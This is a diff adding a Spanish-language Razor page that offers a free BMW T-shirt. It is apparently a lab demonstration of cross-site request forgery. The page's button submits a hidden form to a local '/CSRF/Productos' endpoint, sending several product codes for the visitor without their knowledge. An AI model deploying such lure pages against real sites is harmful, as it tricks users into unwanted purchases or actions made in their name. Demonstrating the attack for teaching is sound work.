@@ -1,0 +1,17 @@
+﻿@{
+    ViewBag.Title = "Home Page";
+}
+
+<div class="jumbotron">
+    <h1>Camiseta Gratis!!</h1>
+    <img src="~/images/camisetaBMW.jpg" height="200" width="150"/>
+    <p>Pulsa el boton y sera totalmente tuya!</p>
+    <form method="post" action="https://localhost:44336/CSRF/Productos">
+        <input type="hidden" name="producto" value="m8" />
+        <input type="hidden" name="producto" value="m2" />
+        <input type="hidden" name="producto" value="2cv" />
+        <button type="submit">
+            Gratis
+        </button>
+    </form>
+</div>
